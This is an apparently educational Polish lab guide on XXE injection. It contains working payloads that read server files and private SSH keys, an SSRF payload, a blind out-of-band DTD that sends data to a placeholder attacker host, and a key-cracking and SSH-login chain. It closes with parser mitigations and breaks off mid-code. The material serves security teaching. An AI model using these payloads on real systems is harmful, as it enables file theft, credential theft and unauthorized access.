# 🛡️ XXE — XML External Entity Injection

<div align="center">

![PJATK](https://img.shields.io/badge/PJATK-HackingDept-green?style=flat-square)
![Zajęcia](https://img.shields.io/badge/Zajęcia-nr%2013-blue?style=flat-square)
![Poziom](https://img.shields.io/badge/Poziom-Entry%20%2F%20Intermediate-orange?style=flat-square)
![OWASP](https://img.shields.io/badge/OWASP-A05%3A2021-red?style=flat-square)

*Notatki tworzone w celach edukacyjnych — wyłącznie na autoryzowanych środowiskach laboratoryjnych.*

</div>

---

> **Dla kogo?** Dla studenta, który chce nie tylko rozwiązać zadanie, ale zrozumieć *dlaczego* to działa — co robi każda komenda, jak przebiega atak od A do Z, i jak tego bronić w prawdziwym projekcie.

---

## 📋 Spis treści

- [Czego się nauczysz?](#-czego-się-nauczysz)
- [Środowisko i VPN](#-środowisko-i-vpn)
- [Co to jest XXE?](#-co-to-jest-xxe)
- [Jak działa parser XML?](#-jak-działa-parser-xml)
  - [DTD — Document Type Definition](#dtd--document-type-definition)
  - [Encje wewnętrzne vs zewnętrzne](#encje-wewnętrzne-vs-zewnętrzne)
- [Powiązane podatności](#-powiązane-podatności)
  - [SSRF](#ssrf-server-side-request-forgery)
  - [HttpOnly a XSS i CSRF](#httponly-a-xss-i-csrf)
- [Wektory ataku — mapa](#-wektory-ataku--mapa)
- [Zadania Blue Team](#-zadania-blue-team)
  - [13.1 — Podstawowy XXE](#131--podstawowy-xxe-odczyt-pliku)
  - [13.2 — XXE do SSRF](#132--xxe-do-ssrf)
  - [13.3 — Blind XXE (OOB)](#133--blind-xxe-eksfiltracja-out-of-band)
- [Scenariusz Pentest (Red Team)](#-scenariusz-pentest-red-team)
  - [13.1p — Rekonesans: /etc/passwd](#131p--rekonesans-etcpasswd)
  - [13.2p — Kradzież klucza SSH](#132p--kradzież-klucza-ssh)
  - [13.3p — Crackowanie hasła](#133p--crackowanie-hasła-john-the-ripper)
  - [13.4p — Połączenie SSH](#134p--połączenie-ssh)
  - [13.5p — Odczyt flagi](#135p--odczyt-flagi)
- [Jak to naprawić? (Mitigacja)](#%EF%B8%8F-jak-to-naprawić-mitigacja)
- [Jak szukać XXE w nieznanej aplikacji?](#-jak-szukać-xxe-w-nieznanej-aplikacji)
- [Przydatne linki](#-przydatne-linki)

---

## 🎯 Czego się nauczysz?

Po przerobieniu tych zadań i notatek będziesz rozumiał:

- ✅ Czym jest encja XML i dlaczego zewnętrzne encje są niebezpieczne
- ✅ Jak XXE może prowadzić do odczytu dowolnych plików z serwera
- ✅ Czym jest SSRF i jak XXE może go wywołać
- ✅ Co to Blind XXE i jak eksfiltrować dane kanałem OOB (Out-of-Band)
- ✅ Jak `php://filter` pozwala obejść problem ze znakami specjalnymi w URL
- ✅ Dlaczego `&#x25;` zamiast `%` w deklaracji encji parametrycznej
- ✅ Jak `ssh2john` + `john` służą do łamania haseł kluczy SSH
- ✅ Dlaczego `chmod 400` jest wymagany przez klienta SSH
- ✅ Jak skutecznie zabezpieczyć parser XML (PHP, Java, Python, Node.js)

---

## 🖥️ Środowisko i VPN

Przed rozpoczęciem zadań upewnij się, że odpowiednie maszyny są włączone w panelu platformy.

| Maszyna | IP | Zadania |
|---|---|---|
| `WEB - XXE` | `192.168.100.13` | 13.1, 13.2, 13.3 (Blue Team) |
| `WEB - XXE PENTEST` | `192.168.100.63` | 13.1p – 13.5p (Red Team) |

**Połączenie VPN (wymagane przed każdym zadaniem):**

```bash
# Pobierz plik .ovpn z menu "VPNy" na stronie głównej platformy
sudo openvpn /ścieżka/do/pliku.ovpn
```

> 💡 Jeśli zadanie się nie zalicza automatycznie mimo poprawnego rozwiązania, wejdź na `/status` na maszynie zadaniowej — znajdziesz tam flagę do ręcznego wklejenia na platformie.

---

## 🔍 Co to jest XXE?

**XXE (XML External Entity Injection)** to podatność sklasyfikowana w [OWASP Top 10 (A05:2021)](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/). Pojawia się, gdy aplikacja:

1. Przetwarza dane wejściowe w formacie XML
2. Ma włączoną obsługę **zewnętrznych encji** w parserze
3. Nie waliduje ani nie ogranicza, co te encje mogą ładować

W skrócie — atakujący wstrzykuje do dokumentu XML specjalną deklarację (`<!ENTITY ... SYSTEM "...">`), która każe parserowi załadować plik z serwera lub wykonać żądanie HTTP. Parser posłusznie to robi, a wynik trafia z powrotem do atakującego.

### Co może zrobić atakujący przez XXE?

| Wektor | Co się dzieje | Skutek |
|---|---|---|
| `file:///etc/passwd` | Parser odczytuje plik lokalny | Ujawnienie listy użytkowników |
| `file:///home/user/.ssh/id_rsa` | Parser odczytuje klucz prywatny | Możliwość zalogowania SSH |
| `file:///etc/shadow` | Parser odczytuje hashe haseł | Możliwość złamania haseł offline |
| `http://127.0.0.1/admin` | Serwer wysyła żądanie do siebie | SSRF — dostęp do wewnętrznych endpointów |
| Billion Laughs (rekurencja encji) | Parser zapętla się | DoS — crash lub freeze serwera |
| Blind XXE + OOB | Dane wysyłane na zewnętrzny serwer | Eksfiltracja bez widocznej odpowiedzi |

---

## 🧠 Jak działa parser XML?

### Podstawowa struktura XML

```xml
<?xml version="1.0" encoding="UTF-8"?>   ← deklaracja XML (wersja + kodowanie)
<note>                                     ← element główny (root element)
  <to>Tove</to>                            ← element potomny z wartością tekstową
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

Parser XML czyta dokument od góry do dołu i buduje drzewo DOM (Document Object Model). Każdy `<tag>` to węzeł, każda wartość między tagami to jego zawartość tekstowa.

### DTD — Document Type Definition

DTD to opcjonalna sekcja deklarowana w `<!DOCTYPE ...>` na początku dokumentu. Definiuje strukturę dokumentu i pozwala deklarować **encje** — czyli skróty, które parser zamienia na ich wartości podczas przetwarzania.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!-- Tu trafiają deklaracje encji i struktury dokumentu -->
]>
<root>...</root>
```

### Encje wewnętrzne vs zewnętrzne

**Encja wewnętrzna** — wartość wpisana bezpośrednio (bezpieczna):

```xml
<!ENTITY nazwa "wartość tekstowa">

<!-- Użycie w dokumencie: -->
<tag>&nazwa;</tag>
<!-- Parser zamienia na: <tag>wartość tekstowa</tag> -->
```

**Encja zewnętrzna** — wartość ładowana z zewnętrznego źródła (NIEBEZPIECZNA):

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
                ↑
         Słowo SYSTEM mówi parserowi:
         "załaduj wartość z tego pliku lub URL"
```

**Encja parametryczna** — używana tylko wewnątrz DTD (oznaczana `%`, nie `&`):

```xml
<!ENTITY % nazwap SYSTEM "http://twoj-serwer/zewnetrzne.dtd">
%nazwap;   ← wywołanie encji parametrycznej — ładuje i wykonuje zewnętrzny DTD
```

> 💡 W Blind XXE używamy encji parametrycznych (`%`), bo pozwalają definiować i wywoływać inne encje wewnątrz DTD — czego zwykłe encje ogólne (`&`) nie mogą robić.

---

## 🔗 Powiązane podatności

### SSRF (Server-Side Request Forgery)

SSRF to podatność pozwalająca zmusić serwer do wysyłania żądań HTTP w imieniu atakującego — do zasobów, które normalnie byłyby niedostępne z zewnątrz.

```
Normalnie:
[Atakujący] → GET http://192.168.100.13/admin → ❌ ZABLOKOWANE przez firewall

Przez SSRF (XXE):
[Atakujący] → POST XML z encją → [Serwer] → GET http://127.0.0.1/admin → ✅ OK
                                  Serwer pyta SAM SIEBIE — firewall nie blokuje localhosta
```

**Dlaczego to niebezpieczne?**
- Dostęp do wewnętrznych API niedostępnych z zewnątrz
- Skanowanie wewnętrznej sieci przez HTTP
- Dostęp do metadanych cloud (np. `http://169.254.169.254/` w AWS/GCP/Azure)
- Omijanie reguł firewall i ACL

**Mitigacja SSRF:**
- Whitelist dozwolonych domen/IP dla zewnętrznych żądań
- Blokada zakresów RFC1918: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- Blokada `169.254.0.0/16` (link-local / cloud metadata endpoints)

---

### HttpOnly a XSS i CSRF

W kontekście ataków na sesje warto rozumieć atrybut `HttpOnly` na ciasteczkach — który pojawia się w materiałach kursu jako dodatkowy element ochrony.

**Problem bez HttpOnly:**
```
Atakujący wykonuje XSS → JavaScript odczytuje document.cookie → kradnie token sesji
→ używa skradzionego tokenu do ataku CSRF na konto ofiary
```

**Z HttpOnly:**
```
Atakujący wykonuje XSS → JavaScript próbuje document.cookie → ❌ ZABLOKOWANE
→ ciasteczka sesyjne niewidoczne dla JavaScript
→ kradzież tokenu niemożliwa → CSRF przez XSS niemożliwy
```

Jak ustawić ciasteczko bezpiecznie:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

| Flaga | Co robi | Chroni przed |
|---|---|---|
| `HttpOnly` | Blokuje dostęp JavaScript do ciasteczka | Kradzieżą sesji przez XSS |
| `Secure` | Ciasteczko wysyłane tylko przez HTTPS | Podsłuchem (MitM) |
| `SameSite=Strict` | Brak ciasteczka w cross-site requests | CSRF |

> 💡 `HttpOnly` nie chroni przed wszystkimi skutkami XSS — atakujący nadal może wykonywać akcje na stronie w imieniu ofiary (np. wysyłać żądania przez fetch/XHR). Chroni jednak przed **kradzieżą samego tokenu sesji**.

---

## ⚔️ Wektory ataku — mapa

```
XXE (XML External Entity)
 │
 ├─── Odczyt pliku lokalnego ─────────── file:///etc/passwd
 │         (in-band)                     file:///etc/shadow
 │                                       file:///home/user/.ssh/id_rsa
 │                                       file:///var/www/html/config.php
 │                                       file:///proc/self/environ
 │
 ├─── SSRF ───────────────────────────── http://127.0.0.1/admin
 │         (in-band)                     http://169.254.169.254/ (AWS metadata)
 │                                       http://wewnętrzny-serwer/api
 │                                       http://localhost:8080/actuator (Spring Boot)
 │
 ├─── Blind XXE (OOB) ────────────────── eksfiltracja przez HTTP GET
 │         (out-of-band)                 eksfiltracja przez DNS lookup
 │                                       php://filter + base64 (bezpieczne kodowanie)
 │
 └─── DoS ────────────────────────────── Billion Laughs (rekurencja encji)
                                         zewnętrzne zasoby blokujące parser
```

---

## 🧪 Zadania Blue Team

> **Środowisko:** `WEB - XXE` → `http://192.168.100.13/`  
> VPN wymagany przed każdym zadaniem.

---

### 13.1 — Podstawowy XXE (odczyt pliku)

**Cel:** Odczytać plik `/flag13.1.txt` z serwera i wkleić flagę na platformie.  
**URL:** `http://192.168.100.13/site1/`

#### Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pjatk [<!ENTITY xxe SYSTEM "/flag13.1.txt">]>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>&xxe;</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

#### Wyjaśnienie linii po linii

```
<?xml version="1.0" encoding="UTF-8"?>
└─ Standardowa deklaracja XML.
   Bez niej niektóre parsery mogą odrzucić dokument lub zachować się nieprzewidywalnie.

<!DOCTYPE pjatk [...]>
└─ Definiujemy inline DTD. Nazwa "pjatk" to identyfikator elementu głównego (dowolna).
   Nawiasy kwadratowe [...] zawierają nasze deklaracje encji.

<!ENTITY xxe SYSTEM "/flag13.1.txt">
└─ Deklarujemy encję zewnętrzną o nazwie "xxe"
└─ SYSTEM = załaduj wartość z zewnętrznego źródła
└─ "/flag13.1.txt" = ścieżka absolutna do pliku na serwerze
   (libxml akceptuje krótką formę bez "file://" dla ścieżek absolutnych)

<heading>&xxe;</heading>
└─ Odwołanie do encji — parser zastępuje &xxe; zawartością pliku /flag13.1.txt
└─ Wynik trafia jako wartość tagu <heading> w odpowiedzi HTTP aplikacji
```

#### Dlaczego akurat tag `<heading>`?

Aplikacja parsuje XML i wyświetla wartości wybranych tagów w odpowiedzi. Wstawiamy encję do tagu, którego wartość jest renderowana. Gdyby `<heading>` nie był wyświetlany, trzeba by przetestować pozostałe tagi (`<to>`, `<from>`, `<body>`).

#### Wynik

```
Heading: PJATK{BasicEntity_caba254}
```

---

### 13.2 — XXE do SSRF

**Cel:** Zmusić serwer do wysłania żądania HTTP pod `http://127.0.0.1/solve13.2/` — z perspektywy samego serwera (localhost), nie z zewnątrz.  
**URL:** `http://192.168.100.13/site2/` (XML Parser 2)

#### Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pjatk [<!ENTITY ssrf SYSTEM "http://127.0.0.1/solve13.2/">]>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>&ssrf;</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

#### Przepływ żądań — co dokładnie się dzieje

```
Krok 1: Ty wysyłasz POST z XML → http://192.168.100.13/site2/

Krok 2: Serwer parsuje XML
         Parser natrafia na &ssrf;
         Encja ssrf ma wartość: SYSTEM "http://127.0.0.1/solve13.2/"

Krok 3: Parser inicjuje żądanie HTTP:
         GET http://127.0.0.1/solve13.2/
               ↑
         To żądanie wychodzi OD SERWERA, nie od Ciebie!
         Z perspektywy sieci — ruch lokalny (loopback)

Krok 4: Endpoint /solve13.2/ rejestruje żądanie → zadanie zaliczone automatycznie
```

#### Dlaczego `127.0.0.1` zamiast zewnętrznego IP?

```
Internet → [Firewall] → [Serwer :80]
                          │
                          ├─ /site1/      ✅ dostępne z zewnątrz
                          ├─ /site2/      ✅ dostępne z zewnątrz
                          └─ /solve13.2/ ❌ tylko localhost (blokowane przez firewall)
```

Przez XXE serwer sam sobie wysyła żądanie do `/solve13.2/` — omijając reguły firewall, bo loopback nie jest filtrowany.

> **Uwaga:** Aplikacja zwróci `Error!` — to normalne. Parser próbuje wstawić odpowiedź HTML z `/solve13.2/` jako wartość XML, co powoduje błąd parsowania. Zadanie i tak zalicza się automatycznie, bo serwer faktycznie wysłał żądanie.

---

### 13.3 — Blind XXE (eksfiltracja Out-of-Band)

**Cel:** Odczytać `/flag13.3.txt` gdy aplikacja **nie zwraca żadnych danych** z parsowania XML.  
**URL:** `http://192.168.100.13/site3/`

#### Dlaczego poprzednie metody nie zadziałają?

```
Zadania 13.1 i 13.2:
  Aplikacja parsuje XML → wyświetla wyniki → odczytujemy flagę z odpowiedzi ✅

Zadanie 13.3:
  Aplikacja parsuje XML → NIE wyświetla nic → nie ma co odczytać ❌
  Potrzebujemy innego kanału wyprowadzenia danych (Out-of-Band channel)
```

**Rozwiązanie:** Serwer docelowy sam "doniesie" nam flagę — wyśle ją w żądaniu HTTP GET do naszego serwera, gdzie zobaczymy ją w logach.

---

#### Krok 1: Przygotuj plik `xxe.dtd` na Kali

```bash
mkdir ~/xxe && cd ~/xxe

cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag13.3.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TWOJE_IP/%file;'>">
%eval;
%exfil;
EOF
```

**Wyjaśnienie każdej linii `xxe.dtd`:**

```
Linia 1:
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag13.3.txt">
│
├─ % file        → encja PARAMETRYCZNA (używana tylko wewnątrz DTD, nie w treści XML)
├─ SYSTEM        → ładuj wartość z zewnętrznego źródła
└─ php://filter/convert.base64-encode/resource=/flag13.3.txt
   │
   ├─ php://filter             → wbudowany stream PHP do transformacji danych
   ├─ convert.base64-encode    → filtr: zakoduj wynik jako base64
   └─ resource=/flag13.3.txt  → źródło danych: plik /flag13.3.txt
   
   Efekt: %file; = zawartość /flag13.3.txt zakodowana base64
   
   Dlaczego base64?
   Flaga zawiera znaki { } które psują URL.
   base64 używa tylko [A-Za-z0-9+/=] → bezpieczne w URL.


Linia 2:
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TWOJE_IP/%file;'>">
│
├─ % eval   → encja parametryczna "eval"
├─ Wartość to deklaracja KOLEJNEJ encji parametrycznej: % exfil
├─ &#x25;   → znak % zapisany jako encja znakowa (0x25 hex = 37 dec = '%')
│            Dlaczego nie po prostu %?
│            Znak % wewnątrz wartości encji parametrycznej byłby
│            interpretowany przez parser jako kolejna encja parametryczna.
│            Trzeba go "uciec" przez encję znakową &#x25;
└─ SYSTEM 'http://TWOJE_IP/%file;'
   └─ URL zawierający %file; — to zostanie zastąpione przez wartość encji %file;
      czyli base64 flagi. Serwer wyśle GET z flagą w URL!


Linia 3: %eval;
└─ Wywołuje encję %eval; → definiuje encję %exfil; (z URL zawierającym flagę)


Linia 4: %exfil;
└─ Wywołuje encję %exfil; → serwer wysyła GET http://TWOJE_IP/<base64_flagi>
   ↑ TUTAJ następuje eksfiltracja!
```

---

#### Krok 2: Uruchom serwer HTTP na Kali

```bash
# Znajdź swoje IP w sieci VPN
ip a | grep tun   # lub ifconfig tun0

# Uruchom serwer HTTP (słucha na port 80)
python3 -m http.server 80
# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

---

#### Krok 3: Wyślij payload do aplikacji

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pjatk [<!ENTITY % xxe SYSTEM "http://TWOJE_IP/xxe.dtd"> %xxe;]>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

```
<!ENTITY % xxe SYSTEM "http://TWOJE_IP/xxe.dtd">
└─ Encja parametryczna xxe wskazuje na nasz zewnętrzny plik DTD

%xxe;
└─ Wywołanie encji → parser pobiera http://TWOJE_IP/xxe.dtd
   i wykonuje jego zawartość (cały łańcuch z Kroku 1)
```

---

#### Krok 4: Obserwuj logi serwera i zdekoduj flagę

Logi serwera Python powinny pokazać dwa żądania:

```
192.168.100.13 - - "GET /xxe.dtd HTTP/1.1" 200 -         ← serwer pobiera nasz DTD ✅
192.168.100.13 - - "GET /UEpBVEt7... HTTP/1.1" 404 -     ← eksfiltracja flagi ✅
                          ↑
                     to jest base64 flagi!
                     (404 bo serwer szuka pliku o tej nazwie — nie istnieje, ale nie ma znaczenia)
```

```bash
echo 'UEpBVEt7...' | base64 -d
# PJATK{...}
```

---

#### Pełny łańcuch eksfiltracji — diagram

```
[Ty] ─── POST XML ──────────────────────────────→ [Serwer 192.168.100.13]
                                                          │
                                                          │ %xxe; → pobiera xxe.dtd
                                                          ↓
[Twój serwer Python] ←── GET /xxe.dtd ─────────── [Serwer 192.168.100.13]
          │                                                │
          │ odpowiada plikiem xxe.dtd                     │ wykonuje xxe.dtd:
          └──────────────────────────────────────────────→│   %file;  → odczyt /flag13.3.txt
                                                          │   → koduj base64
                                                          │   %eval;  → definiuje %exfil;
                                                          │   %exfil; → wysyła GET z flagą
                                                          ↓
[Twój serwer Python] ←── GET /UEpBVEt7... ──────── [Serwer 192.168.100.13]
          │
          └── logujesz żądanie → dekodujesz base64 → PJATK{...} ✅
```

---

## 🔴 Scenariusz Pentest (Red Team)

> **Środowisko:** dwie maszyny — `WEB - XXE` (`192.168.100.13`) i `WEB - XXE PENTEST` (`192.168.100.63`)

Scenariusz symuluje **realny łańcuch ataku**: od znalezienia XXE w aplikacji webowej, przez rekonesans i kradzież klucza SSH, po uzyskanie pełnego dostępu do serwera.

```
Łańcuch ataku:
  [XXE w aplikacji]
       │
       ├─ 1. /etc/passwd       → identyfikacja użytkownika: sshadmin
       ├─ 2. /home/sshadmin/.ssh/id_rsa → kradzież klucza prywatnego SSH
       ├─ 3. ssh2john + john   → złamanie hasła do klucza
       ├─ 4. ssh -i id_rsa     → dostęp do serwera 192.168.100.63
       └─ 5. cat flag.txt      → flaga
```

---

### 13.1p — Rekonesans: /etc/passwd

**Cel:** Znaleźć nazwę użytkownika systemowego na maszynie docelowej.  
**URL:** `http://192.168.100.63/`

#### Payload

```xml
<!DOCTYPE pjatk [<!ENTITY xxe SYSTEM "/etc/passwd">]>
<PLANT>
  <COMMON>&xxe;</COMMON>
  <BOTANICAL>Sanguinaria canadensis</BOTANICAL>
  <ZONE>4</ZONE>
  <LIGHT>Mostly Shady</LIGHT>
  <AVAILABILITY>031599</AVAILABILITY>
</PLANT>
```

> Ta aplikacja używa struktury XML opartej na roślinach (`<PLANT>`). Wstawiamy `&xxe;` do tagu `<COMMON>`, bo jego wartość jest wyświetlana w polu "Name" w odpowiedzi.

#### Czym jest `/etc/passwd` i co z niego odczytujemy?

```
Format każdej linii:
  nazwa:x:UID:GID:opis:/katalog_domowy:/powłoka

Przykład z wyniku:
  sshadmin:x:1001:1001::/home/sshadmin:/bin/bash
    │                        │               │
    │                        │               └─ /bin/bash → użytkownik może się logować
    │                        └─ /home/sshadmin → katalog domowy → szukamy tu klucza SSH
    └─ sshadmin → nazwa użytkownika → cel dalszego ataku

Konta systemowe (pomiń):
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33::/var/www:/usr/sbin/nologin
   └─ /nologin lub /false → te konta nie mogą się interaktywnie logować
```

**Wniosek:** Istnieje użytkownik `sshadmin` z aktywną powłoką i katalogiem domowym `/home/sshadmin`. Sprawdzamy, czy ma klucz SSH.

---

### 13.2p — Kradzież klucza SSH

**Cel:** Odczytać klucz prywatny SSH użytkownika `sshadmin`.

#### Payload

```xml
<!DOCTYPE pjatk [<!ENTITY xxe SYSTEM "/home/sshadmin/.ssh/id_rsa">]>
<PLANT>
  <COMMON>&xxe;</COMMON>
  <BOTANICAL>Sanguinaria canadensis</BOTANICAL>
  <ZONE>4</ZONE>
  <LIGHT>Mostly Shady</LIGHT>
  <AVAILABILITY>031599</AVAILABILITY>
</PLANT>
```

#### Jak działa uwierzytelnianie kluczem SSH?

```
Klucz prywatny (id_rsa)   → TAJNY, tylko u właściciela
Klucz publiczny (id_rsa.pub) → publiczny, wgrany na serwer do ~/.ssh/authorized_keys

Logowanie:
1. Klient SSH: "Chcę się zalogować jako sshadmin"
2. Serwer SSH: generuje losowy challenge, szyfruje go kluczem publicznym sshadmin
3. Klient SSH: odszyfrowuje challenge kluczem prywatnym, odsyła odpowiedź
4. Serwer SSH: weryfikuje → dostęp przyznany (bez podawania hasła!)

Konsekwencja: kto ma id_rsa, może logować się jako sshadmin
```

#### Struktura katalogu `.ssh`

```
~/.ssh/
  ├── id_rsa            ← klucz PRYWATNY (nigdy nie powinien opuścić maszyny!)
  ├── id_rsa.pub        ← klucz publiczny (bezpieczny do udostępniania)
  ├── authorized_keys   ← lista kluczy publicznych uprawnionych do logowania
  └── known_hosts       ← fingerprints znanych serwerów (ochrona przed MitM)
```

#### ⚠️ Jak prawidłowo skopiować klucz

Klucz prywatny PEM jest **wrażliwy na formatowanie** — złamane linie lub dodatkowe spacje psują jego strukturę.

```
❌ NIE kopiuj z renderowanego tekstu strony (przeglądarka łamie długie linie)
✅ Skopiuj ze źródła strony HTML: Ctrl+U w Firefox/Chrome
   → szukaj: -----BEGIN OPENSSH PRIVATE KEY-----
   → kopiuj aż do: -----END OPENSSH PRIVATE KEY-----
```

Prawidłowy format:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAA...
(ciąg base64, łamany co ~70 znaków — zachowaj podział linii!)
-----END OPENSSH PRIVATE KEY-----
```

---

### 13.3p — Crackowanie hasła (John the Ripper)

**Cel:** Złamać passphrase (hasło) chroniące skradziony klucz prywatny.

#### Krok 1: Zapisz klucz do pliku

```bash
nano id_rsa
# Wklej klucz (Ctrl+Shift+V), zapisz: Ctrl+X → Y → Enter

chmod 600 id_rsa
# Uprawnienia rw------- (wymagane przez ssh2john i SSH)
```

#### Krok 2: Konwertuj klucz do formatu Johna

```bash
ssh2john id_rsa > id_rsa.john
```

**Co robi `ssh2john`?**

```
Zaszyfrowany klucz SSH nie przechowuje hasła wprost — przechowuje:
  - zaszyfrowaną zawartość klucza
  - parametry algorytmu szyfrowania (np. AES-256-CBC)
  - sól (salt) użytą przy szyfrowaniu

ssh2john wyciąga te informacje i zapisuje jako hash w formacie:
  id_rsa:$sshng$2$16$...$...

John the Ripper wie jak obsługiwać ten format hasha.
```

#### Krok 3: Atak słownikowy

```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/carders.cc.txt id_rsa.john
```

**Jak działa atak słownikowy krok po kroku:**

```
1. John bierze słowo ze słownika, np. "password123"
2. Oblicza: zaszyfruj klucz prywatny używając "password123" i parametrów z hasha
3. Wynik == zaszyfrowany klucz w id_rsa? → TAK: hasło znalezione. NIE: następne słowo
4. Powtarza dla każdego słowa w słowniku (mogą być miliony)

Wynik:
lampe3..hejhej123    (id_rsa)
      ↑                  ↑
    hasło (passphrase)  nazwa pliku z hashem
```

**Dlaczego akurat `carders.cc.txt`?**

To słownik zbudowany z realnych haseł wyciekłych z baz danych. Zawiera hasła, których ludzie faktycznie używali — co czyni go skutecznym. Kolekcja SecLists (Daniel Miessler) jest dostępna domyślnie na Kali Linux i zawiera dziesiątki takich słowników.

---

### 13.4p — Połączenie SSH

**Cel:** Zalogować się do maszyny `192.168.100.63` jako `sshadmin` używając skradzionego klucza.

```bash
# Krok 1: Ustaw poprawne uprawnienia do klucza (WYMAGANE przez SSH)
chmod 400 id_rsa

# Krok 2: Połącz się z kluczem prywatnym
ssh -i id_rsa sshadmin@192.168.100.63
# Enter passphrase for key 'id_rsa': lampe3..hejhej123
```

#### Dlaczego `chmod 400` jest wymagany?

SSH sprawdza uprawnienia pliku klucza zanim go użyje. Zbyt szerokie uprawnienia = odmowa:

```
Bez chmod 400 (uprawnienia 644):
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!    @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
```

```
chmod 400 → uprawnienia: -r--------
                          │││└─ inni: brak (---)
                          ││└── grupa: brak (---)
                          │└─── właściciel: tylko odczyt (r--)
                          └──── typ pliku (- = zwykły plik)

4 = r (read)
0 = --- (brak)
0 = --- (brak)
```

#### Flagi polecenia `ssh`

```
ssh           → klient SSH (Secure Shell)
-i id_rsa     → użyj tego pliku jako klucza prywatnego (-i = identity file)
sshadmin      → nazwa użytkownika na zdalnym serwerze
@192.168.100.63 → adres IP maszyny docelowej
```

---

### 13.5p — Odczyt flagi

**Cel:** Po zalogowaniu SSH znaleźć i odczytać flagę z katalogu domowego.

```bash
ls        # wylistuj pliki w bieżącym katalogu (domyślnie: katalog domowy sshadmin)
cat *     # wypisz zawartość wszystkich plików w katalogu
```

**Co robi `cat *`?**

```
*       → wildcard shell (glob) — pasuje do wszystkich plików w bieżącym katalogu
cat     → concatenate — wypisuje zawartość pliku(ów) na standardowe wyjście (stdout)
cat *   → wypisuje zawartość KAŻDEGO pliku w katalogu, jeden po drugim
```

Jeśli w katalogu jest jeden plik (np. `flag.txt`) — `cat *` i `cat flag.txt` są równoważne. Jeśli jest ich więcej, `cat *` wypisze wszystkie.

---

## 🛡️ Jak to naprawić? (Mitigacja)

### 1. Wyłącz zewnętrzne encje w parserze XML ← NAJWAŻNIEJSZE

Najskuteczniejsza i najprostsza obrona. Konfiguracja zależy od języka:

**PHP (libxml):**
```php
// PHP < 8.0 — wyłącz ręcznie:
libxml_disable_entity_loader(true);

// PHP 8.0+ — wyłączone domyślnie ✅ nie trzeba nic robić
```

**Java (DocumentBuilderFactory):**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Opcja 1: Wyłącz DOCTYPE całkowicie (najbezpieczniejsza)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Opcja 2: Wyłącz tylko zewnętrzne encje (jeśli DOCTYPE jest potrzebne)
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**Python (lxml):**
```python
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,   # nie rozwiązuj encji zewnętrznych
    no_network=True,          # blokuj żądania sieciowe z parsera
    load_dtd=False            # nie ładuj zewnętrznych DTD
)
tree = etree.parse(untrusted_xml_file, parser)
```

**Python (xml.etree.ElementTree — biblioteka standardowa):**
```python
# Podatna na DoS (Billion Laughs) — używaj defusedxml:
import defusedxml.ElementTree as ET

tree = ET.parse(untrusted_xml)   # bezpieczna zamiennik standardowej biblioteki
```

**Node.js:**
```javascript
// fast-xml-parser (popularna biblioteka) — domyślnie nie obsługuje DTD ✅
const { XMLParser } = require('fast-xml-parser');
const parser = new XMLParser();   // bezpieczna domyślna konfiguracja
```

---

### 2. Użyj bezpieczniejszego formatu danych

Jeśli nie potrzebujesz specyficznych funkcji XML (przestrzeni nazw, walidacji XSD, XSLT), rozważ **JSON**:

```
XML  → obsługuje DTD → możliwe XXE
JSON → brak DTD      → XXE niemożliwe ✅
```

Migracja z XML do JSON w REST API to dobra praktyka zarówno pod kątem bezpieczeństwa, jak i prostoty kodu.

---

### 3. Zasada najmniejszych uprawnień (Principle of Least Privilege)

Aplikacja webowa nie powinna mieć dostępu do plików poza swoim zakresem:

```bash
# Utwórz dedykowanego użytkownika dla aplikacji (bez powłoki interaktywnej)
useradd -r -s /usr/sbin/nologin webapp

# Przyznaj dostęp tylko do katalogu aplikacji
chown -R webapp:webapp /var/www/myapp/
chmod 750 /var/www/myapp/

# Efekt: nawet jeśli XXE istnieje, aplikacja nie odczyta /home/sshadmin/.ssh/id_rsa
# bo webapp nie ma uprawnień do katalogu /home/sshadmin/
```

---

### 4. Whitelist zewnętrznych zasobów

Jeśli parser musi ładować zewnętrzne schematy (np. XSD), ogranicz dostęp do zaufanych hostów:

```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_HOSTS = {"schemas.example.com", "cdn.example.com"}

PRIVATE_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
